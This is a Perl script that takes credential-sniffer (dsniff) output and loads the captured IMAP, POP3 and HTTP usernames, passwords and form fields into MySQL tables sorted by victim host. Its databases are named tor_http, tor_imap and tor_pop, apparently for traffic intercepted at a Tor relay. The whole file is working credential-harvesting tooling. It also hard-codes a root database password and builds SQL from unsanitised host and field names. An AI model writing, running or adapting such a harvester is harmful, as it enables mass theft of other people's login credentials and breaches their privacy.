#!/usr/bin/perl

use warnings;
no warnings 'uninitialized';	

use strict;
use Data::Dumper;
use Net::DNS;
use DBI;

my $file = shift; my $data;
my $rejectfile = shift;
our %ascii = init();
our $db_host = "localhost";
our $db_pass = "snarfalarfalus";
our $db_user = "root";

open(INPUT, $file) || die 'what the fuck, try again';
open(REJECTS, '>>', $rejectfile)  || die 'could not do reject file';
my $data; while ( <INPUT> ) { $data .= $_; }
#my $data = qx(dsniff -p $file -m -n);
for (split('-----------------', $data)) { 
	my ($date, $time, $host, $proto);
	my @lines = split('\n',$_);
	shift @lines;
	if ($_ =~ m/(\S*) (\S*) \S* \S* \S* \S* \((\S*)\)/) {
		$date = $1; $time = $2; $proto = $3;
	}
	if ($proto eq 'http') {
		my $mysql = DBI->connect("DBI:mysql:database=tor_http;host=$db_host",$db_user,$db_pass,{'RaiseError' => '1'});
		http($mysql, $date, $time, @lines);
		$mysql->disconnect();
	} elsif ($proto eq 'imap') {
		my $mysql = DBI->connect("DBI:mysql:database=tor_imap;host=$db_host",$db_user,$db_pass,{'RaiseError' => '1'});
		imap($mysql, $date, $time, @lines);
		$mysql->disconnect();
	} elsif ($proto eq 'pop' || $proto eq 'pop3') { 
		my $mysql = DBI->connect("DBI:mysql:database=tor_pop;host=$db_host",$db_user,$db_pass,{'RaiseError' => '1'});
		pop3($mysql, $date, $time, @lines);
		$mysql->disconnect();
	}
}

close REJECTS;

sub imap {
	my $mysql = shift; my $cap_date = shift; my $cap_time = shift;
	my @lines = @_;
	my ($host, $user, $pass);
	if ($lines[0] =~ m/-> (.*)\.143/) { $host = $1; }
	if ( $host =~ m/\d+\.\d+\.\d+\.\d+/ ) { $host = reverse_lookup($host); 	} 
	if ($lines[1] =~ m/LOGIN (\S+) (\S+)/) { $user = $1; $pass = $2;}
	eval { 
		$mysql->do("CREATE TABLE \`$host\` 
				( capture_num INT NOT NULL AUTO_INCREMENT PRIMARY KEY, 
				capture_date VARCHAR(64),
				capture_time VARCHAR(64),
				insertion_timestamp TIMESTAMP(8),
				user VARCHAR(128),
				pass VARCHAR(128),
				valid BOOL
			)");
	};
	$pass = $mysql->quote($pass);
	$user = $mysql->quote($user);
	eval { 
		$mysql->do("INSERT INTO \`$host\` SET \`user\`=$user,
		\`pass\`=$pass,\`valid\`=1,\`capture_date\`=\'$cap_date\',\`capture_time\`=\'$cap_time\'"); 
	};

}

sub pop3 {
	my $mysql = shift; my $cap_date = shift; my $cap_time = shift;
	my @lines = @_;
	my ($host, $user, $pass);
	if ($lines[0] =~ m/-> (.*)\.110/) { $host = $1; }
	if ( $host =~ m/\d+\.\d+\.\d+\.\d+/ ) { $host = reverse_lookup($host); 	} 
	if ($lines[1] =~ m/USER (\S+)/) { $user = $1; }
	if ($lines[2] =~ m/PASS (\S+)/) { $pass = $1; }
	eval { 
		$mysql->do("CREATE TABLE \`$host\` 
				( capture_num INT NOT NULL AUTO_INCREMENT PRIMARY KEY, 
				capture_date VARCHAR(64),
				capture_time VARCHAR(64),
				insertion_timestamp TIMESTAMP(8),
				user VARCHAR(128),
				pass VARCHAR(128),
				valid BOOL
			)");
	};
	if ($host ne '' & $user ne '' & $pass ne'') {
		if ( $host =~ m/\d+\.\d+\.\d+\.\d+/ ) { $host = reverse_lookup($host); 	} 
		$pass = $mysql->quote($pass);
		$user = $mysql->quote($user);
		eval { 
			$mysql->do("INSERT INTO \`$host\` SET \`user\`=$user,
			\`pass\`=$pass,\`valid\`=1,\`capture_date\`=\'$cap_date\',\`capture_time\`=\'$cap_time\'"); 
		};
	}

}

sub http {
	my $mysql = shift; my $cap_date = shift; my $cap_time = shift;
	my @lines = @_;
	shift @lines;
	my ($host, $target,$content);
	
	my $size = @lines;
	if ( $lines[1] =~ m/Host: (.*)/ ) { $host = $1;	}
	if ( $lines[0] =~ m/^(GET|POST) (\S*) HTTP/) { $target = $2;}
	if ( $lines[0] =~ m/^GET/ ) { 
		#GET
		if ( $size eq '2' ) { 
			# special case for dsniff weirdness	
			$target =~ s/\?/\n/;
			my @tmp = split('\n', $target);
			$target = $tmp[0];
			$content = $tmp[1];
		} elsif ( $size eq '1' ) {
			if ($target =~ m/http:\/\/(.*)\/(.*)\?(.*)/ ) {
				$host = $1;
				$target = $2;
				$content = $3;
			}
		} else {
			$content = $lines[-1] if $size gt '2';
		}
	} elsif ( $lines[0] =~ m/^POST/ ) {
		$content = $lines[-1] if $size gt '2';
		#POST
	}
	if ($content =~ m/Authorization: \S+ \S+ \[(.*):(.*)\]/) { 
		$content = "user=$1&pass=$2";
	}

	$content = convert_ascii($content);
	if ( $host =~ m/\d+\.\d+\.\d+\.\d+/ ) { $host = reverse_lookup($host); 	} 
	if ($host ne '' & $target ne '' & $content ne '' ) { 
		if ( $host =~ m/(.*)\.$/ ) { $host = $1; } # sometimes host ends in period
		eval { 
			$mysql->do("CREATE TABLE \`$host\` 
					( capture_num INT NOT NULL AUTO_INCREMENT PRIMARY KEY, 
					capture_date VARCHAR(64),
					capture_time VARCHAR(64),
					insertion_timestamp TIMESTAMP(8) 
				)");
		};
		#print "----\nhost: $host\n target: $target\n content: $content\n\n";
		my $params = "\`capture_date`=\'$cap_date\',\`capture_time\`=\'$cap_time\',";
		my $add;
		for ( split('&',$content) ) {
		 	$_ =~ s/=/\n/;
			my @tmp = split('\n',$_);
			$add .= "ADD \`$tmp[0]\` VARCHAR(512),";		
			my $quoted = $mysql->quote($tmp[1]);
			$params .= "\`$tmp[0]\`=$quoted,";
		}

		chop $params; chop $add;
		print "INSERT INTO \`$host\` SET $params";
		print "ALTER TABLE \`$host\` $add";
		eval { $mysql->do("ALTER TABLE \`$host\` $add"); };
		eval { $mysql->do("INSERT INTO \`$host\` SET $params"); };
	} else {
		# failures
		printf REJECTS "\n";
		for ( @lines) { 
			printf REJECTS "$_\n";
		}
	}

}

sub reverse_lookup {
	my $res = Net::DNS::Resolver->new;
	my $ip = shift;
	my $target_ip = join('.', reverse split(/\./, $ip)).".in-addr.arpa";
	my $query = $res->query("$target_ip", "PTR");
	if ($query) {
		foreach my $rr ($query->answer) {
			next unless $rr->type eq "PTR";
			return $rr->rdatastr;
			}
		} else {
		return $ip;
}

}

sub convert_ascii {
	my $text = shift;
	for (keys %ascii) { $text =~ s/$_/$ascii{$_}/gi; }
	return $text;
}
	

sub init {
	my %hash = (
		'%00'	=> '(nul)',
		'%20'	=> ' ',
		'%40'	=> '@',
		'%60'	=> '`',
		'%01'	=> '(soh)',
		'%21'	=> '!',
		'%41'	=> 'A',
		'%61'	=> 'a',
		'%02'	=> '(stx)',
		'%22'	=> '"',
		'%42'	=> 'B',
		'%62'	=> 'b',
		'%03'	=> '(etx)',
		'%23'	=> '#',
		'%43'	=> 'C',
		'%63'	=> 'c',
		'%04'	=> '(eot)',
		'%24'	=> '$',
		'%44'	=> 'D',
		'%64'	=> 'd',
		'%05'	=> '(enq)',
		'%25'	=> '%',
		'%45'	=> 'E',
		'%65'	=> 'e',
		'%06'	=> '(ack)',
		'%26'	=> '&',
		'%46'	=> 'F',
		'%66'	=> 'f',
		'%07'	=> '(bel)',
		'%27'	=> '\'',
		'%47'	=> 'G',
		'%67'	=> 'g',
		'%08'	=> '(bs)',
		'%28'	=> '(',
		'%48'	=> 'H',
		'%68'	=> 'h',
		'%09'	=> '(ht)',
		'%29'	=> ')',
		'%49'	=> 'I',
		'%69'	=> 'i',
		'%0a'	=> '(nl)',
		'%2a'	=> '*',
		'%4a'	=> 'J',
		'%6a'	=> 'j',
		'%0b'	=> '(vt)',
		'%2b'	=> '+',
		'%4b'	=> 'K',
		'%6b'	=> 'k',
		'%0c'	=> '(np)',
		'%2c'	=> ',',
		'%4c'	=> 'L',
		'%6c'	=> 'l',
		'%0d'	=> '(cr)',
		'%2d'	=> '-',
		'%4d'	=> 'M',
		'%6d'	=> 'm',
		'%0e'	=> '(so)',
		'%2e'	=> '.',
		'%4e'	=> 'N',
		'%6e'	=> 'n',
		'%0f'	=> '(si)',
		'%2f'	=> '/',
		'%4f'	=> 'O',
		'%6f'	=> 'o',
		'%10'	=> '(dle)',
		'%30'	=> '0',
		'%50'	=> 'P',
		'%70'	=> 'p',
		'%11'	=> '(dc1)',
		'%31'	=> '1',
		'%51'	=> 'Q',
		'%71'	=> 'q',
		'%12'	=> '(dc2)',
		'%32'	=> '2',
		'%52'	=> 'R',
		'%72'	=> 'r',
		'%13'	=> '(dc3)',
		'%33'	=> '3',
		'%53'	=> 'S',
		'%73'	=> 's',
		'%14'	=> '(dc4)',
		'%34'	=> '4',
		'%54'	=> 'T',
		'%74'	=> 't',
		'%15'	=> '(nak)',
		'%35'	=> '5',
		'%55'	=> 'U',
		'%75'	=> 'u',
		'%16'	=> '(syn)',
		'%36'	=> '6',
		'%56'	=> 'V',
		'%76'	=> 'v',
		'%17'	=> '(etb)',
		'%37'	=> '7',
		'%57'	=> 'W',
		'%77'	=> 'w',
		'%18'	=> '(can)',
		'%38'	=> '8',
		'%58'	=> 'X',
		'%78'	=> 'x',
		'%19'	=> '(em)',
		'%39'	=> '9',
		'%59'	=> 'Y',
		'%79'	=> 'y',
		'%1a'	=> '(sub)',
		'%3a'	=> ':',
		'%5a'	=> 'Z',
		'%7a'	=> 'z',
		'%1b'	=> '(esc)',
		'%3b'	=> ';',
		'%5b'	=> '[',
		'%7b'	=> '{',
		'%1c'	=> '(fs)',
		'%3c'	=> '<',
		'%5c'	=> '\\',
		'%7c'	=> '|',
		'%1d'	=> '(gs)',
		'%3d'	=> '=',
		'%5d'	=> ']',
		'%7d'	=> '}',
		'%1e'	=> '(rs)',
		'%3e'	=> '>',
		'%5e'	=> '^',
		'%7e'	=> '~',
		'%1f'	=> '(us)',
		'%3f'	=> '?',
		'%5f'	=> '_',
		'%7f'	=> '(del)',
	);
	return %hash;
}

